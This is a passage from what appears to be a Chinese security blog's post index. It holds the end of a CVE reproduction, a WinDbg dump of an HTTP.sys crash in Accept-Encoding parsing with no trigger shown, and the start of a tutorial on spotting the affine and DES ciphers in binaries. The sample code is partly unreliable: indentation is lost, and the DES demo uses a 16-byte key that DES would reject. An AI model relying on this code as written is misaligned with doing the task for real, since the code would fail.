src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220718132331376.png" alt="image-20220718132331376"></p><p>复现结果：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220718143918838.png" alt="image-20220718143918838"></p><p>附录：dump文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line">KEY_VALUES_STRING: 1</span><br><span class="line"></span><br><span class="line">    Key  : Analysis.CPU.mSec</span><br><span class="line">    Value: 155</span><br><span class="line"></span><br><span class="line">    Key  : Analysis.DebugAnalysisManager</span><br><span class="line">    Value: Create</span><br><span class="line"></span><br><span class="line">    Key  : Analysis.Elapsed.mSec</span><br><span class="line">    Value: 120018</span><br><span class="line"></span><br><span class="line">    Key  : Analysis.Init.CPU.mSec</span><br><span class="line">    Value: 1421</span><br><span class="line"></span><br><span class="line">    Key  : Analysis.Init.Elapsed.mSec</span><br><span class="line">    Value: 552696</span><br><span class="line"></span><br><span class="line">    Key  : Analysis.Memory.CommitPeak.Mb</span><br><span class="line">    Value: 61</span><br><span class="line"></span><br><span class="line">    Key  : Bugcheck.Code.DumpHeader</span><br><span class="line">    Value: 0x139</span><br><span class="line"></span><br><span class="line">    Key  : Bugcheck.Code.Register</span><br><span class="line">    Value: 0x139</span><br><span class="line"></span><br><span class="line">    Key  : Dump.Attributes.AsUlong</span><br><span class="line">    Value: 8</span><br><span class="line"></span><br><span class="line">    Key  : Dump.Attributes.KernelGeneratedTriageDump</span><br><span class="line">    Value: 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">FILE_IN_CAB:  071422-8890-01.dmp</span><br><span class="line"></span><br><span class="line">ADDITIONAL_DEBUG_TEXT:  </span><br><span class="line">You can run &#x27;.symfix; .reload&#x27; to try to fix the symbol path and load symbols.</span><br><span class="line"></span><br><span class="line">WRONG_SYMBOLS_TIMESTAMP: f08de83e</span><br><span class="line"></span><br><span class="line">WRONG_SYMBOLS_SIZE: 1046000</span><br><span class="line"></span><br><span class="line">FAULTING_MODULE: fffff8005e600000 nt</span><br><span class="line"></span><br><span class="line">DUMP_FILE_ATTRIBUTES: 0x8</span><br><span class="line">  Kernel Generated Triage Dump</span><br><span class="line"></span><br><span class="line">BUGCHECK_CODE:  139</span><br><span class="line"></span><br><span class="line">BUGCHECK_P1: 3</span><br><span class="line"></span><br><span class="line">BUGCHECK_P2: ffff8080d6faf5c0</span><br><span class="line"></span><br><span class="line">BUGCHECK_P3: ffff8080d6faf518</span><br><span class="line"></span><br><span class="line">BUGCHECK_P4: 0</span><br><span class="line"></span><br><span class="line">TRAP_FRAME:  ffff8080d6faf5c0 -- (.trap 0xffff8080d6faf5c0)</span><br><span class="line">NOTE: The trap frame does not contain all registers.</span><br><span class="line">Some register values may be zeroed or incorrect.</span><br><span class="line">rax=0000000000000001 rbx=0000000000000000 rcx=0000000000000003</span><br><span class="line">rdx=ffffb30bae58d700 rsi=0000000000000000 rdi=0000000000000000</span><br><span class="line">rip=fffff8005cb3f537 rsp=ffff8080d6faf750 rbp=ffff8080d6faf809</span><br><span class="line"> r8=ffffb30bae589190  r9=0000000000000008 r10=00000000ffffffff</span><br><span class="line">r11=0000000000000133 r12=0000000000000000 r13=0000000000000000</span><br><span class="line">r14=0000000000000000 r15=0000000000000000</span><br><span class="line">iopl=0         nv up ei ng nz na pe cy</span><br><span class="line">HTTP!UlFreeUnknownCodingList+0x63:</span><br><span class="line">fffff800`5cb3f537 cd29            int     29h</span><br><span class="line">Resetting default scope</span><br><span class="line"></span><br><span class="line">EXCEPTION_RECORD:  ffff8080d6faf518 -- (.exr 0xffff8080d6faf518)</span><br><span class="line">ExceptionAddress: fffff8005cb3f537 (HTTP!UlFreeUnknownCodingList+0x0000000000000063)</span><br><span class="line">   ExceptionCode: c0000409 (Security check failure or stack buffer overrun)</span><br><span class="line">  ExceptionFlags: 00000001</span><br><span class="line">NumberParameters: 1</span><br><span class="line">   Parameter[0]: 0000000000000003</span><br><span class="line">Subcode: 0x3 FAST_FAIL_CORRUPT_LIST_ENTRY </span><br><span class="line"></span><br><span class="line">BLACKBOXNTFS: 1 (!blackboxntfs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BLACKBOXWINLOGON: 1</span><br><span class="line"></span><br><span class="line">CUSTOMER_CRASH_COUNT:  1</span><br><span class="line"></span><br><span class="line">EXCEPTION_STR:  WRONG_SYMBOLS</span><br><span class="line"></span><br><span class="line">STACK_TEXT:  </span><br><span class="line">ffff8080`d6faf750 fffff800`5caf6ac5     : ffff9f0f`8cfb5f8f ffff8080`00000001 ffff8080`d6faf7d4 00000000`00000000 : HTTP!UlFreeUnknownCodingList+0x63</span><br><span class="line">ffff8080`d6faf780 fffff800`5cacd191     : ffff05ed`f48a51e3 ffff8080`d6faf959 00000000`00000010 fffff800`5cacd140 : HTTP!UlpParseAcceptEncoding+0x298f5</span><br><span class="line">ffff8080`d6faf870 fffff800`5caa9368     : fffff800`5ca746e0 ffff8080`d6faf959 ffff9f0f`8dfdc010 00000000`00000000 : HTTP!UlAcceptEncodingHeaderHandler+0x51</span><br><span class="line">ffff8080`d6faf8c0 fffff800`5caa8a47     : ffff9f0f`8cfb5d88 00000000`00000231 00000000`00000000 fffff800`5e922b60 : HTTP!UlParseHeader+0x218</span><br><span class="line">ffff8080`d6faf9c0 fffff800`5ca04c5f     : ffff9f0f`9154fe08 ffff9f0f`9154fbf0 ffff8080`d6fafbb9 00000000`00000000 : HTTP!UlParseHttp+0xac7</span><br><span class="line">ffff8080`d6fafb20 fffff800`5ca0490a     : fffff800`5ca04760 ffff9f0f`8cfb5d20 00000000`00000000 00000000`00000001 : HTTP!UlpParseNextRequest+0x1ff</span><br><span class="line">ffff8080`d6fafc20 fffff800`5caa4852     : fffff800`5ca04760 fffff800`5ca04760 00000000`00000001 00000000`00000000 : HTTP!UlpHandleRequest+0x1aa</span><br><span class="line">ffff8080`d6fafcc0 fffff800`5e955935     : ffff9f0f`9154fc70 fffff800`5ca75f80 00000000`00000584 00038000`ad1b3dfe : HTTP!UlpThreadPoolWorker+0x112</span><br><span class="line">ffff8080`d6fafd50 ffff9f0f`9154fc70     : fffff800`5ca75f80 00000000`00000584 00038000`ad1b3dfe ffff9f0f`8dda6040 : nt+0x355935</span><br><span class="line">ffff8080`d6fafd58 fffff800`5ca75f80     : 00000000`00000584 00038000`ad1b3dfe ffff9f0f`8dda6040 00000000`00000000 : 0xffff9f0f`9154fc70</span><br><span class="line">ffff8080`d6fafd60 00000000`00000584     : 00038000`ad1b3dfe ffff9f0f`8dda6040 00000000`00000000 00000000`00000000 : HTTP!UlThreadPoolArena</span><br><span class="line">ffff8080`d6fafd68 00038000`ad1b3dfe     : ffff9f0f`8dda6040 00000000`00000000 00000000`00000000 00000000`00000001 : 0x584</span><br><span class="line">ffff8080`d6fafd70 ffff9f0f`8dda6040     : 00000000`00000000 00000000`00000000 00000000`00000001 ffff9f0f`8dda7080 : 0x00038000`ad1b3dfe</span><br><span class="line">ffff8080`d6fafd78 00000000`00000000     : 00000000`00000000 00000000`00000001 ffff9f0f`8dda7080 fffff800`5e9fe728 : 0xffff9f0f`8dda6040</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">STACK_COMMAND:  .trap 0xffff8080d6faf5c0 ; kb</span><br><span class="line"></span><br><span class="line">IMAGE_VERSION:  10.0.19041.1339</span><br><span class="line"></span><br><span class="line">EXCEPTION_CODE_STR:  F08DE83E</span><br><span class="line"></span><br><span class="line">PROCESS_NAME:  ntoskrnl.wrong.symbols.exe</span><br><span class="line"></span><br><span class="line">IMAGE_NAME:  ntoskrnl.wrong.symbols.exe</span><br><span class="line"></span><br><span class="line">MODULE_NAME: nt_wrong_symbols</span><br><span class="line"></span><br><span class="line">SYMBOL_NAME:  nt_wrong_symbols!F08DE83E1046000</span><br><span class="line"></span><br><span class="line">FAILURE_BUCKET_ID:  WRONG_SYMBOLS_X64_TIMESTAMP_971121-002430_F08DE83E_nt_wrong_symbols!F08DE83E1046000</span><br><span class="line"></span><br><span class="line">OSPLATFORM_TYPE:  x64</span><br><span class="line"></span><br><span class="line">OSNAME:  Windows 10</span><br><span class="line"></span><br><span class="line">FAILURE_ID_HASH:  &#123;9b688587-ec16-b628-626c-931e41c64f62&#125;</span><br><span class="line"></span><br><span class="line">Followup:     MachineOwner</span><br><span class="line">---------</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> cve </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>常见加密算法逆向特征分析</title>
      <link href="/2022/06/25/%E5%B8%B8%E8%A7%81%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/"/>
      <url>/2022/06/25/%E5%B8%B8%E8%A7%81%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="常见加密算法逆向特征分析"><a href="#常见加密算法逆向特征分析" class="headerlink" title="常见加密算法逆向特征分析"></a>常见加密算法逆向特征分析</h1><p>​    本博文秉持不求甚解的精神，不求理解，只求看出来是什么算法。</p><p>​    此外，本博文在AES、RC4部分有对b站up主：<strong>可厉害的土豆</strong> 视频的参考，并截取了其中的一些图片，因此本博客并非完全原创。</p><h2 id="0x01-仿射加密"><a href="#0x01-仿射加密" class="headerlink" title="0x01 仿射加密"></a>0x01 仿射加密</h2><h3 id="一、解密脚本"><a href="#一、解密脚本" class="headerlink" title="一、解密脚本"></a>一、解密脚本</h3><p>先上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#仿射密码加密与解密实现算法</span></span><br><span class="line"><span class="comment"># -*- coding=utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#输入密钥</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">accept</span>():</span></span><br><span class="line">k1,k2 = <span class="built_in">map</span>(<span class="built_in">int</span>,<span class="built_in">input</span>(<span class="string">&#x27;请输入两个密钥(以空格隔开)：&#x27;</span>).split())</span><br><span class="line"><span class="keyword">while</span> gcd(k1, <span class="number">26</span>) !=<span class="number">1</span>:</span><br><span class="line">k1,k2 = <span class="built_in">map</span>(<span class="built_in">int</span>,<span class="built_in">input</span>(<span class="string">&#x27;k1和26不互素，请重新输入密钥：&#x27;</span>).split())</span><br><span class="line"><span class="keyword">return</span> k1,k2</span><br><span class="line"></span><br><span class="line"><span class="comment">#判断互素</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span>(<span class="params">k1,m</span>):</span></span><br><span class="line">t = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> m!=<span class="number">0</span>:</span><br><span class="line">t = m</span><br><span class="line">m = k1%m</span><br><span class="line">k1 = t</span><br><span class="line"><span class="keyword">return</span> k1</span><br><span class="line"></span><br><span class="line"><span class="comment">#求逆元</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">niyuan</span>(<span class="params">k1</span>):</span></span><br><span class="line">n = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> (k1 * n) % <span class="number">26</span> != <span class="number">1</span>:</span><br><span class="line">n += <span class="number">1</span></span><br><span class="line"><span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line"><span class="comment">#加密算法</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>():</span></span><br><span class="line"><span class="comment">#输入密钥</span></span><br><span class="line">k1,k2 = accept()</span><br><span class="line"></span><br><span class="line">plain = <span class="built_in">input</span>(<span class="string">&quot;输入明文&quot;</span>)</span><br><span class="line">c = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plain)):</span><br><span class="line"><span class="comment">#小写字母</span></span><br><span class="line"><span class="keyword">if</span> plain[i].islower():</span><br><span class="line">c.append(<span class="built_in">chr</span>(((<span class="built_in">ord</span>(plain[i])-<span class="number">97</span>)*k1+k2)%<span class="number">26</span>+<span class="number">97</span>))</span><br><span class="line"><span class="comment">#大写字母</span></span><br><span class="line"><span class="keyword">elif</span> plain[i].isupper():</span><br><span class="line">c.append(<span class="built_in">chr</span>(((<span class="built_in">ord</span>(plain[i])-<span class="number">65</span>)*k1+k2)%<span class="number">26</span>+<span class="number">65</span>))</span><br><span class="line"><span class="comment">#其他</span></span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">c.append(plain[i])</span><br><span class="line"></span><br><span class="line">cipher = <span class="string">&#x27;&#x27;</span>.join(c)</span><br><span class="line"><span class="built_in">print</span>(cipher)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;加密完成！&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#解密算法</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>():</span></span><br><span class="line"><span class="comment">#输入密钥</span></span><br><span class="line">k1,k2 = accept()</span><br><span class="line"><span class="comment">#逆元</span></span><br><span class="line">ny = niyuan(k1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cipher = <span class="built_in">input</span>(<span class="string">&quot;输入密文&quot;</span>)</span><br><span class="line">p = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line"><span class="comment">#小写字母</span></span><br><span class="line"><span class="keyword">if</span> cipher[i].islower():</span><br><span class="line">t1 = <span class="built_in">ord</span>(cipher[i])-<span class="number">97</span>-k2</span><br><span class="line"><span class="keyword">if</span> t1 &lt; <span class="number">0</span>:</span><br><span class="line">t1 +=<span class="number">26</span></span><br><span class="line">p.append(<span class="built_in">chr</span>((ny * t1)%<span class="number">26</span>+<span class="number">97</span>))</span><br><span class="line"><span class="comment">#大写字母</span></span><br><span class="line"><span class="keyword">elif</span> cipher[i].isupper():</span><br><span class="line">t2 = <span class="built_in">ord</span>(cipher[i])-<span class="number">65</span>-k2</span><br><span class="line"><span class="keyword">if</span> t2 &lt; <span class="number">0</span>:</span><br><span class="line">t2 +=<span class="number">26</span></span><br><span class="line">p.append(<span class="built_in">chr</span>((ny * t2)%<span class="number">26</span>+<span class="number">65</span>))</span><br><span class="line"><span class="comment">#其他</span></span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">p.append(cipher[i])</span><br><span class="line"></span><br><span class="line">plain = <span class="string">&#x27;&#x27;</span>.join(p)</span><br><span class="line"><span class="built_in">print</span>(plain)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;解密完成！&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">ch = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;加密请输入【1】：\n解密请输入【2】：\n退出请输入【3】：&quot;</span>))</span><br><span class="line"><span class="keyword">if</span> ch == <span class="number">1</span>:</span><br><span class="line">encrypt()</span><br><span class="line"><span class="keyword">elif</span> ch == <span class="number">2</span>:</span><br><span class="line">decrypt()</span><br><span class="line"><span class="keyword">elif</span> ch == <span class="number">3</span>:</span><br><span class="line">exit()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;请输入1或2&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="二、程序情况"><a href="#二、程序情况" class="headerlink" title="二、程序情况"></a>二、程序情况</h3><h4 id="1、基本概况"><a href="#1、基本概况" class="headerlink" title="1、基本概况"></a>1、基本概况</h4><p>仿射就是利用如：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220625184110096.png" alt="image-20220625184110096"></p><p>的表达式，通过<strong>密钥a、b</strong>对<strong>密文x</strong>进行加密。</p><h4 id="2、特征"><a href="#2、特征" class="headerlink" title="2、特征"></a>2、特征</h4><p>一般来说，因为仿射加密加密的内容只能是<strong>英文的26个字母</strong>，因此一般程序一开始会对于输入做限制：</p><p>然后加密就这么写：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;++i)&#123;</span><br><span class="line">    temp=<span class="built_in">array</span>[i]-<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    temp = (temp*key_a+key_b)%<span class="number">26</span>;</span><br><span class="line">    <span class="built_in">array</span>[i]=temp+<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x02-DES"><a href="#0x02-DES" class="headerlink" title="0x02 DES"></a>0x02 DES</h2><p>DES加密是一种经典的分组、对称加密算法。</p><h3 id="一、解密脚本-1"><a href="#一、解密脚本-1" class="headerlink" title="一、解密脚本"></a>一、解密脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">desenc</span>(<span class="params">key, plaintext</span>):</span></span><br><span class="line">    plaintext = pad(plaintext, <span class="number">8</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;* DES Encryption *&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">b&quot;key: &quot;</span> + key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">b&quot;plaintext: &quot;</span> + plaintext)</span><br><span class="line">    des = DES.new(key, DES.MODE_ECB)</span><br><span class="line">    ciphertext = des.encrypt(plaintext)</span><br><span class="line">    <span class="comment"># ciphertext = binascii.b2a_hex(ciphertext)</span></span><br><span class="line">    <span class="built_in">print</span>(ciphertext)</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">desdec</span>(<span class="params">key, ciphertext</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;* DES Decryption *&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">b&quot;key: &quot;</span> + key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">b&quot;ciphertext: &quot;</span> + ciphertext)</span><br><span class="line">    des = DES.new(key, DES.MODE_ECB)</span><br><span class="line">    plaintext = des.decrypt(ciphertext)</span><br><span class="line">    <span class="comment"># plaintext = binascii.b2a_hex(plaintext)</span></span><br><span class="line">    <span class="built_in">print</span>(plaintext)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">transfer</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="comment"># a = &quot;\\x&quot; + s.replace(&quot;h, &quot;, &quot;\\x&quot;).replace(&quot;h&quot;, &quot;&quot;)</span></span><br><span class="line">    <span class="comment"># a = a.split(&quot;\\x&quot;)[1:]</span></span><br><span class="line">    <span class="comment"># l = []</span></span><br><span class="line">    <span class="comment"># for i in a:</span></span><br><span class="line">    <span class="comment">#     if len(i) == 3 and i[0] == &#x27;0&#x27;:</span></span><br><span class="line">    <span class="comment">#         i = i[1:]</span></span><br><span class="line">    <span class="comment">#     l.append(i)</span></span><br><span class="line">    <span class="comment"># r = &quot;&quot;.join(l)</span></span><br><span class="line">    l = s.split(<span class="string">&quot;, &quot;</span>)</span><br><span class="line">    r = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(i) == <span class="number">1</span>:</span><br><span class="line">            r.append(<span class="string">&quot;0&quot;</span> + i)</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">len</span>(i) == <span class="number">3</span>:</span><br><span class="line">            r.append(i[:<span class="number">2</span>])</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">len</span>(i) == <span class="number">4</span>:</span><br><span class="line">            r.append(i[<span class="number">1</span>:<span class="number">3</span>])</span><br><span class="line">    r = <span class="string">&quot;&quot;</span>.join(r)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># # DES</span></span><br><span class="line">desenc(<span class="string">b&#x27;1234567890123456&#x27;</span>, <span class="string">b&#x27;python spider!&#x27;</span>)</span><br><span class="line">    desdec(<span class="string">b&#x27;1234567890123456&#x27;</span>, desenc(<span class="string">b&#x27;1234567890123456&#x27;</span>, <span class="string">b&#x27;python spider!&#x27;</span>))</span><br></pre></td></tr></table></figure><h3 id="二、程序情况-1"><a href="#二、程序情况-1" class="headerlink" title="二、程序情况"></a>二、程序情况</h3><p>des好就好在，虽然过程有点复杂，但是他的<strong>常量</strong>多的起飞。</p><h4 id="1、基本情况："><a href="#1、基本情况：" class="headerlink" title="1、基本情况："></a>1、基本情况：</h4><p>​    密钥长 <strong>64 位</strong>，密钥事实上是 <strong>56 位</strong>参与 DES 运算（第 8、16、24、32、40、48、56、 64 位是校验位，使得每个密钥都有奇数个 1），分组后的明文组和 56 位的密钥按位替代或交换的方法形成密文组。</p><p>​    其主要加密流程有<strong>16轮</strong>：</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220625205203397.png" alt="image-20220625205203397" style="zoom:67%;" /><h4 id="2、常量使用"><a href="#2、常量使用" class="headerlink" title="2、常量使用"></a>2、常量使用</h4><p><strong>ip置换：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> IP_Table[<span class="number">64</span>]= &#123;</span><br><span class="line">        <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>,</span><br><span class="line">        <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">64</span>, <span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>,</span><br><span class="line">        <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>,  <span class="number">9</span>, <span class="number">1</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>,</span><br><span class="line">        <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">7</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>S盒置换：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 